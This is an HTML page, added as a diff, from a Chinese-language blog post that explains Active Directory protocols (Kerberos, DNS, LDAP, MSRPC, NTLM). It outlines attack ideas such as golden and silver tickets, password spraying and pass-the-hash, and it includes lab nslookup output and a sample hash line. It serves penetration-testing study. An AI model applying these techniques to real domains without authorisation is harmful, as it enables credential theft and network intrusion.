@@ -1,0 +1,893 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Mosaic Theory">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Kerberos协议：Kerberos 协议使用端口 88（TCP 和 UDP）。在枚举 Active Directory 环境时，我们通常可以通过使用 Nmap 等工具执行端口扫描来查找开放端口 88 来定位域控制器。 kerberos认证：AS-REQ:客户端向域控发送一个包含了客户端的用户名，主机名，加密类型，用用户ntml哈希加密的时间戳给DC。 AS-REP:DC他不会验证你是不是在域内">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Active Directory 协议理论">
+<meta property="og:url" content="http://example.com/2022/10/06/Active%20Directory%20%E5%8D%8F%E8%AE%AE%E7%90%86%E8%AE%BA/index.html">
+<meta property="og:site_name" content="Personal Cloud Note">
+<meta property="og:description" content="Kerberos协议：Kerberos 协议使用端口 88（TCP 和 UDP）。在枚举 Active Directory 环境时，我们通常可以通过使用 Nmap 等工具执行端口扫描来查找开放端口 88 来定位域控制器。 kerberos认证：AS-REQ:客户端向域控发送一个包含了客户端的用户名，主机名，加密类型，用用户ntml哈希加密的时间戳给DC。 AS-REP:DC他不会验证你是不是在域内">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220502190821901.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220502200324468.png">
+<meta property="article:published_time" content="2022-10-06T11:30:34.881Z">
+<meta property="article:modified_time" content="2022-07-09T08:02:24.000Z">
+<meta property="article:author" content="Crazyinside">
+<meta property="article:tag" content="Active Directory">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.worldisend.com/img/image-20220502190821901.png">
+  
+  
+  
+  <title>Active Directory 协议理论 - Personal Cloud Note</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Crazyinside&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Active Directory 协议理论"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-06 19:30" pubdate>
+          October 6, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          16k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          130 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Active Directory 协议理论</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="Kerberos协议："><a href="#Kerberos协议：" class="headerlink" title="Kerberos协议："></a>Kerberos协议：</h3><p>Kerberos 协议使用端口 88（TCP 和 UDP）。在枚举 Active Directory 环境时，我们通常可以通过使用 Nmap 等工具执行端口扫描来查找开放端口 88 来定位域控制器。</p>
+<h4 id="kerberos认证："><a href="#kerberos认证：" class="headerlink" title="kerberos认证："></a>kerberos认证：</h4><h5 id="AS-REQ"><a href="#AS-REQ" class="headerlink" title="AS-REQ:"></a>AS-REQ:</h5><p>客户端向域控发送一个包含了客户端的用户名，主机名，加密类型，用用户ntml哈希加密的时间戳给DC。</p>
+<h5 id="AS-REP"><a href="#AS-REP" class="headerlink" title="AS-REP:"></a>AS-REP:</h5><p>DC他不会验证你是不是在域内。只会通过AD活动目录去查询客户端的哈希值，然后用哈希去解密客户端的请求包。解密成功验证时间戳(通常为五分钟之内)成功即密码是正确的。（校验时间戳主要为了防止重放攻击。）认证成功就会返回包含<strong>krbtgt用户</strong>NTML哈希加密后的TGT认购权证和用户哈希加密的login session key、时间戳、PAC中包含用户的SID、用户所在组等一些信息。（该login sessin key主要为了确保下次认证安全）以及其他一些信息。（黄金票据便是在这里产生）</p>
+<h5 id="TGS-REQ"><a href="#TGS-REQ" class="headerlink" title="TGS-REQ:"></a>TGS-REQ:</h5><p>客户端收到域控的返回包，用自己哈希去解密获得login session key 用以生成<strong>认证因素</strong>，还有DC发的<strong>TGT票据认购凭证</strong>（客户端会将这俩东西缓存到内存中），客户端会凭借TGT票据去向域控购买响应的ST服务票据。</p>
+<p>ST服务是通过DC的另一个TGS服务出售的，在这个阶段，微软引入了两个扩展自协议s4uself和s4u2proxy(当委派的时候，才用得到)如果客户端需要访问某个服务便会凭借TGT认购凭证去向DC上的TGS购买入场卷。</p>
+<p>于是客户端向DC的TGS申请请求某个服务器的请求包，请求包包含客户端信息，认证因素，TGT认购凭证，要访问的服务器名称和一些其他信息。</p>
+<h5 id="TGS-REP"><a href="#TGS-REP" class="headerlink" title="TGS-REP:"></a>TGS-REP:</h5><p>DC上的TGS会检查这个服务器存在不存在，如果存在的话就从活动AD中取出<strong>krbtgt用户</strong>的ntml哈希去解密TGT，检查TGT的原始地址是不是客户端，时间戳是否过期。然后用login session key解密客户端认证因素。匹对时间戳、随机数，如果认证通过，就会用login session key 加密用于确保客户端和服务器之间通信安全的 server session key。然后为客户端生成一个用要访问的<strong>服务账号NTML哈希</strong>加密的ST服务票据（包含server session key）发送给客户端。（白银票据便是在这里产生）</p>
+<p>客户端收到返回包通过log session key解密获取server session key，再拿到ST服务票据，这时候server session key和服务器票据都会缓存在客户端内存。然后客户端用server session key 生成认证因素和ST票据去请求服务器。</p>
+<h5 id="PAC"><a href="#PAC" class="headerlink" title="PAC:"></a>PAC:</h5><p>服务器拿自己ntml哈希去解密自己的票据后获取server session key ，然后用server session key去解密客户端认证因素去匹对时间戳，随机数。 如果都没问题，会向DC去发起一个请求看该客户端是不是在活动目录里，它的访问权限，能不能访问我，就是验证客户端的SID认证权限，如果在的话DC会返回给服务器一个在。服务器就会把结果返回给客户端。</p>
+<h4 id="kerberos的缺陷："><a href="#kerberos的缺陷：" class="headerlink" title="kerberos的缺陷："></a>kerberos的缺陷：</h4><h5 id="域用户枚举："><a href="#域用户枚举：" class="headerlink" title="域用户枚举："></a>域用户枚举：</h5><p>域控校验用户名存在不存在返回的数据包不一样，可枚举域用户名。</p>
+<h5 id="密码喷洒："><a href="#密码喷洒：" class="headerlink" title="密码喷洒："></a>密码喷洒：</h5><p>域用户密码正确和错误返回的数据包也不一样，可暴力破解密码喷洒。</p>
+<h5 id="黄金票据："><a href="#黄金票据：" class="headerlink" title="黄金票据："></a>黄金票据：</h5><p>在第一次客户端向域控请求时，域控认证通过后返回TGT是用<strong>krbtgt用户</strong>哈希加密的，所以我们如果有<strong>krbtgt用户</strong>的哈希，完全可以自己生成TGT认证票据。这就是黄金票据。</p>
+<p>伪造黄金票据的前提，我们要有域用户（一般是域管理）域名：域SID(就是域成员SID前面部分) ：krbtgt账号的ntml哈希值或AES-256哈希值</p>
+<h5 id="白银票据："><a href="#白银票据：" class="headerlink" title="白银票据："></a><strong>白银票据：</strong></h5><p>在向TGS请求入场卷返回的ST服务器票据，如果我们有服务器的ntml哈希，就可以自己伪造生成ST服务器票据，我们想啥时候访问啥时候访问。不过它只针对特定服务。如果TGS在生成ST票据是加上 krbtgt用户的签名，而服务器又要去认证该签名，白银票据就会没啥用。</p>
+<p>伪造白银票据的前提，我们要有域用户、域名、域SID、服务器的NTML哈希</p>
+<h4 id="kerberos的利用方式："><a href="#kerberos的利用方式：" class="headerlink" title="kerberos的利用方式："></a>kerberos的利用方式：</h4><h5 id="hash传递（PTH）："><a href="#hash传递（PTH）：" class="headerlink" title="hash传递（PTH）："></a>hash传递（PTH）：</h5><p>是指攻击者可以通过捕获密码的hash值(对应着密码的值)，然后简单地将其传递来进行身份验证，以此来横向访问其他网络系统。</p>
+<h5 id="域外用户枚举："><a href="#域外用户枚举：" class="headerlink" title="域外用户枚举："></a>域外用户枚举：</h5><p>如果不在域内，域控校验用户名存在不存在返回的数据包不一样，可枚举域用户名。</p>
+<h5 id="密码喷洒攻击："><a href="#密码喷洒攻击：" class="headerlink" title="密码喷洒攻击："></a>密码喷洒攻击：</h5><p>域用户密码正确和错误返回的数据包也不一样，可暴力破解密码喷洒。</p>
+<h5 id="黄金票据：-1"><a href="#黄金票据：-1" class="headerlink" title="黄金票据："></a>黄金票据：</h5><p>可以肆意的向域控TGS购买访问服务器的凭证。</p>
+<h5 id="SPN枚举"><a href="#SPN枚举" class="headerlink" title="SPN枚举:"></a>SPN枚举:</h5><p>服务器所运行服务的唯一标识，只要是在kerberos协议内的服务，都会具有一个唯一标识像身份证号码一样。</p>
+<p>所以我们可通过SPN枚举域内有哪些服务。针对服务我们可以通过pth或别的方式登录上去进行下一步的横向移动。</p>
+<h5 id="白银票据：-1"><a href="#白银票据：-1" class="headerlink" title="白银票据："></a>白银票据：</h5><p>通过白银票据直接发送给服务器去访问指定服务，来进行攻击，此过程无需KDC。但是伪造的白银票据没有KDC签名，如果服务器开启了KDC签名认证，白银票据是无法使用的。</p>
+<h3 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议:"></a>DNS协议:</h3><p>Active Directory 域服务 (AD DS) 使用 DNS 允许客户端（工作站、服务器和其他与域通信的系统）定位域控制器，并允许托管目录服务的域控制器在它们之间进行通信。DNS 用于将主机名解析为 IP 地址，并广泛用于内部网络和互联网。专用内部网络使用 Active Directory DNS 命名空间来促进服务器、客户端和对等方之间的通信。</p>
+<p>AD 以服务记录 (SRV) 的形式维护在网络上运行的服务数据库。这些服务记录允许 AD 环境中的客户端找到他们需要的服务，例如文件服务器、打印机或域控制器。动态 DNS 用于在系统 IP 地址更改时自动更改 DNS 数据库。手动输入这些条目将非常耗时，并且会留下错误的空间。如果 DNS 数据库没有主机的正确 IP 地址，客户端将无法在网络上找到它并与之通信。</p>
+<p>当客户端加入网络时，它通过向 DNS 服务发送查询、从 DNS 数据库中检索 SRV 记录并将域控制器的主机名传输给客户端来定位域控制器。客户端然后使用此主机名来获取域控制器的 IP 地址。</p>
+<p><strong>DNS 使用 TCP 和 UDP 端口 53。UDP 端口 53 是默认端口，但当不再能够通信并且 DNS 消息大于 512 字节时，它会回退到 TCP。</strong></p>
+<h5 id="正向-DNS-查找："><a href="#正向-DNS-查找：" class="headerlink" title="正向 DNS 查找："></a>正向 DNS 查找：</h5><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">nslookup <span class="hljs-built_in">Domainname</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">PS C:\htb&gt; nslookup INLANEFREIGHT.LOCAL<br><br><span class="hljs-symbol">Server:</span>  <span class="hljs-number">172.16</span><span class="hljs-number">.6</span><span class="hljs-number">.5</span><br><span class="hljs-symbol">Address:</span>  <span class="hljs-number">172.16</span><span class="hljs-number">.6</span><span class="hljs-number">.5</span><br><br><span class="hljs-symbol">Name:</span>    INLANEFREIGHT.LOCAL<br><span class="hljs-symbol">Address:</span>  <span class="hljs-number">172.16</span><span class="hljs-number">.6</span><span class="hljs-number">.5</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="反向-DNS-查找"><a href="#反向-DNS-查找" class="headerlink" title="反向 DNS 查找:"></a>反向 DNS 查找:</h5><p>如果我们想使用 IP 地址获取单个主机的 DNS 名称，我们可以这样做。</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">nslookup</span> <span class="hljs-built_in">IP</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">PS</span> C:\htb&gt; nslookup <span class="hljs-number">172.16.6.5</span><br><br>Server:  <span class="hljs-number">172.16.6.5</span><br>Address:  <span class="hljs-number">172.16.6.5</span><br><br>Name:    ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL<br>Address:  <span class="hljs-number">172.16.6.5</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="查找主机的-IP-地址："><a href="#查找主机的-IP-地址：" class="headerlink" title="查找主机的 IP 地址："></a>查找主机的 IP 地址：</h5><p>如果我们想找到单个主机的 IP 地址，我们可以反过来做。我们可以在指定或不指定 FQDN 的情况下执行此操作。</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nslookup HostName</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">PS C:\htb&gt; nslookup ACADEMY-EA-DC01<br><br><span class="hljs-symbol">Server:</span>   <span class="hljs-number">172.16</span><span class="hljs-number">.6</span><span class="hljs-number">.5</span><br><span class="hljs-symbol">Address:</span>  <span class="hljs-number">172.16</span><span class="hljs-number">.6</span><span class="hljs-number">.5</span><br><br><span class="hljs-symbol">Name:</span>    ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL<br><span class="hljs-symbol">Address:</span>  <span class="hljs-number">172.16</span><span class="hljs-number">.6</span><span class="hljs-number">.5</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP:"></a>LDAP:</h3><p>Active Directory 支持用于目录查找的<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol">轻量级目录访问协议 (LDAP) 。</a>LDAP 是一种开源和跨平台协议，用于针对各种目录服务（例如 AD）进行身份验证。</p>
+<p>AD 存储用户帐户信息和密码等安全信息，并有助于与网络上的其他设备共享这些信息。LDAP 是应用程序用来与提供目录服务的其他服务器通信的语言。换句话说，LDAP 是网络环境中的系统可以与 AD “对话”的方式。</p>
+<p>LDAP 会话首先连接到 LDAP 服务器，也称为目录系统代理。AD 中的域控制器主动侦听 LDAP 请求，例如安全认证请求。</p>
+<p>AD 和 LDAP 的关系可以比作 Apache 和 HTTP。与 Apache 是使用 HTTP 协议的 Web 服务器一样，Active Directory 是使用 LDAP 协议的目录服务器。</p>
+<p>虽然不常见，但您可能会在执行没有 AD 但有 LDAP 的评估时遇到组织，这意味着他们很可能使用另一种类型的 LDAP 服务器，例如<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/OpenLDAP">OpenLDAP</a>。</p>
+<h5 id="AD-LDAP-身份验证："><a href="#AD-LDAP-身份验证：" class="headerlink" title="AD LDAP 身份验证："></a>AD LDAP 身份验证：</h5><p>LDAP 设置为使用“BIND”操作针对 AD 验证凭据，以设置 LDAP 会话的身份验证状态。有两种类型的 LDAP 身份验证。</p>
+<ol>
+<li><code>Simple Authentication</code>：这包括匿名认证、未经认证的认证和用户名/密码认证。简单身份验证意味着一个<code>username</code>并<code>password</code>创建一个 BIND 请求来向 LDAP 服务器进行身份验证。</li>
+<li><code>SASL Authentication</code>：<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Simple_Authentication_and_Security_Layer">简单身份验证和安全层 (SASL)</a>框架使用其他身份验证服务（例如 Kerberos）绑定到 LDAP 服务器，然后使用此身份验证服务（本示例中为 Kerberos）对 LDAP 进行身份验证。LDAP 服务器使用 LDAP 协议向授权服务发送 LDAP 消息，授权服务启动一系列质询/响应消息，从而导致身份验证成功或不成功。由于身份验证方法与应用程序协议的分离，SASL 可以提供额外的安全性。</li>
+</ol>
+<p>默认情况下，LDAP 身份验证消息以明文形式发送，因此任何人都可以在内部网络上嗅出 LDAP 消息。建议使用 TLS 加密或类似方法来保护传输中的信息。</p>
+<h5 id="MSRPC："><a href="#MSRPC：" class="headerlink" title="MSRPC："></a>MSRPC：</h5><p>MSRPC 是 Microsoft 对远程过程调用 (RPC) 的实现，这是一种用于基于客户端-服务器模型的应用程序的进程间通信技术。Windows 系统使用 MSRPC 通过四个关键的 RPC 接口访问 Active Directory 中的系统。</p>
+<table>
+<thead>
+<tr>
+<th>接口名称</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>lsarpc</code></td>
+<td>一组对<a target="_blank" rel="noopener" href="https://networkencyclopedia.com/local-security-authority-lsa/">本地安全机构 (LSA)</a>系统的 RPC 调用，该系统管理计算机上的本地安全策略、控制审计策略并提供交互式身份验证服务。LSARP 用于对域安全策略进行管理。</td>
+</tr>
+<tr>
+<td><code>netlogon</code></td>
+<td>Netlogon 是一个 Windows 进程，用于对域环境中的用户和其他服务进行身份验证。它是在后台持续运行的服务。</td>
+</tr>
+<tr>
+<td><code>samr</code></td>
+<td>远程 SAM (samr) 为域帐户数据库提供管理功能，存储有关用户和组的信息。IT 管理员使用该协议来管理用户、组和计算机，使管理员能够创建、读取、更新和删除有关安全原则的信息。攻击者（和渗透测试者）可以使用 samr 协议使用诸如<a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/">BloodHound 之</a>类的工具对内部域执行侦察，以直观地绘制 AD 网络并创建“攻击路径”，以直观地说明如何实现管理访问或全域入侵。组织可以<a target="_blank" rel="noopener" href="https://stealthbits.com/blog/making-internal-reconnaissance-harder-using-netcease-and-samri1o/">保护</a>通过更改 Windows 注册表项以仅允许管理员执行远程 SAM 查询来对抗这种类型的侦察，因为默认情况下，所有经过身份验证的域用户都可以进行这些查询以收集有关 AD 域的大量信息。</td>
+</tr>
+<tr>
+<td><code>drsuapi</code></td>
+<td>drsuapi 是实现目录复制服务 (DRS) 远程协议的 Microsoft API，用于在多 DC 环境中跨域控制器执行与复制相关的任务。攻击者可以利用 drsuapi<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1003/003/">创建 Active Directory 域数据库</a>(NTDS.dit) 文件的副本，以检索域中所有帐户的密码哈希，然后可用于执行 Pass-the-Hash 攻击以访问更多系统或破解使用 Hashcat 等工具离线获取明文密码，以使用远程桌面 (RDP) 和 WinRM 等远程管理协议登录系统。</td>
+</tr>
+</tbody></table>
+<h3 id="NTML身份认证："><a href="#NTML身份认证：" class="headerlink" title="NTML身份认证："></a>NTML身份认证：</h3><p>除了 Kerberos 和 LDAP，Active Directory 还使用其他几种身份验证方法，这些方法可以被 AD 中的应用程序和服务使用（和滥用）。这些包括 LM、NTLM、NTLMv1 和 NTLMv2。这里的 LM 和 NTLM 是哈希名称，NTLMv1 和 NTLMv2 是使用 LM 或 NT 哈希的身份验证协议。下面是这些哈希和协议之间的快速比较，它向我们表明，尽管 Kerberos 无论如何都不是完美的，但它通常是尽可能选择的身份验证协议。了解散列类型和使用它们的协议之间的区别至关重要。</p>
+<h4 id="哈希协议比较"><a href="#哈希协议比较" class="headerlink" title="哈希协议比较"></a>哈希协议比较</h4><table>
+<thead>
+<tr>
+<th><strong>哈希/协议</strong></th>
+<th><strong>密码技术</strong></th>
+<th><strong>相互认证</strong></th>
+<th><strong>消息类型</strong></th>
+<th><strong>受信任的第三方</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>NTLM</code></td>
+<td>对称密钥密码术</td>
+<td>不</td>
+<td>随机数</td>
+<td>域控制器</td>
+</tr>
+<tr>
+<td><code>NTLMv1</code></td>
+<td>对称密钥密码术</td>
+<td>不</td>
+<td>MD4哈希，随机数</td>
+<td>域控制器</td>
+</tr>
+<tr>
+<td><code>NTLMv2</code></td>
+<td>对称密钥密码术</td>
+<td>不</td>
+<td>MD4哈希，随机数</td>
+<td>域控制器</td>
+</tr>
+<tr>
+<td><code>Kerberos</code></td>
+<td>对称密钥密码学和非对称密码学</td>
+<td>是的</td>
+<td>使用 DES、MD5 加密票证</td>
+<td>域控制器，/密钥分发中心 (KDC)</td>
+</tr>
+</tbody></table>
+<h5 id="LM"><a href="#LM" class="headerlink" title="LM:"></a>LM:</h5><p><code>LAN Manager</code>(LM) 哈希是 Windows 操作系统使用的最古老的密码存储机制。LM 于 1987 年在 OS/2 操作系统上首次亮相。如果正在使用，它们将存储在 Windows 主机上的 SAM 数据库和域控制器上的 NTDS.DIT 数据库中。由于用于 LM 散列的散列算法存在重大安全漏洞，自 Windows Vista/Server 2008 以来它已默认关闭。但是，它仍然很常见，尤其是在仍然使用旧系统的大型环境中。</p>
+<p>使用 LM 的密码被限制为最多<code>14</code>字符。密码不区分大小写，并在生成散列值之前转换为大写，将密钥空间限制为总共 69 个字符，使得使用 Hashcat 等工具破解这些散列相对容易。</p>
+<p>在散列之前，一个 14 个字符的密码首先被分成两个 7 个字符的块。如果密码少于十四个字符，它将用 NULL 字符填充以达到正确的值。</p>
+<p>从每个块创建两个 DES 密钥。然后使用字符串对这些块进行加密，创建两个 8 字节的密文值。然后将这两个值连接在一起，产生一个 LM 哈希。</p>
+<p>这种散列算法意味着攻击者只需要两次暴力破解七个字符而不是整个 14 个字符，从而可以在具有一个或多个 GPU 的系统上快速破解 LM 散列。如果密码是七个字符或更少，LM 哈希的后半部分将始终是相同的值，甚至可以在不需要 Hashcat 等工具的情况下直观地确定。<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-do-not-store-lan-manager-hash-value-on-next-password-change">使用组策略</a>可以禁止使用 LM 哈希。</p>
+<h5 id="NTHash-NTLM-："><a href="#NTHash-NTLM-：" class="headerlink" title="NTHash (NTLM)："></a>NTHash (NTLM)：</h5><p><strong>NT LAN Manager(NTLM)</strong> 哈希用于现代 Windows 系统。它是一种质询-响应认证协议，使用三个消息进行认证：</p>
+<ol>
+<li>客户端首先向服务器发送一个NEGOTIATE_MESSAGE（谈判）。</li>
+<li>服务响应一个CHALLENGE_MESSAGE（质疑），以验证客户端的身份。</li>
+<li>客户端响应一个AUTHENTICATE_MESSAGE（鉴定）。这些哈希值存储在本地 SAM 数据库或域控制器上的 NTDS.DIT 数据库文件中。</li>
+</ol>
+<p>尽管它们比 LM 哈希（支持 65,536 个字符的整个 Unicode 字符集）强得多，但它们仍然可以使用 Hashcat 等工具进行离线破解。更长的 NTLM 哈希可能更难破解，甚至长密码（15 个以上字符）也可以使用离线字典攻击结合规则来破解。NTLM 也容易受到 pass-the-hash 攻击，这意味着攻击者可以仅使用 NTLM 哈希（在通过另一次成功攻击获得后）对用户是本地管理员的目标系统进行身份验证，而无需知道明文值的密码。</p>
+<figure class="highlight plaintext"><figcaption><span>身份验证请求</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs NTLM">Rachel:500:aad3c435b514a4eeaad3b935b51304fe:e46b9e548fa0d122de7f59fb6d48eaa2:::<br></code></pre></td></tr></table></figure>
+
+<p>查看上面的哈希，我们可以将 NTLM 哈希分解为各个部分：</p>
+<ul>
+<li><code>Rachel</code>是用户名</li>
+<li><code>500</code>是相对标识符 (RID)。500 是<code>administrator</code>帐户的已知 RID</li>
+<li><code>aad3c435b514a4eeaad3b935b51304fe</code>是 LM 哈希，如果系统上禁用了 LM 哈希，则不能用于任何事情</li>
+<li><code>e46b9e548fa0d122de7f59fb6d48eaa2</code>是 NT 哈希。此哈希可以离线破解以显示明文值（取决于密码的长度/强度）或用于传递哈希攻击。</li>
+</ul>
+<p>使用<a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a>工具成功传递哈希攻击的示例</p>
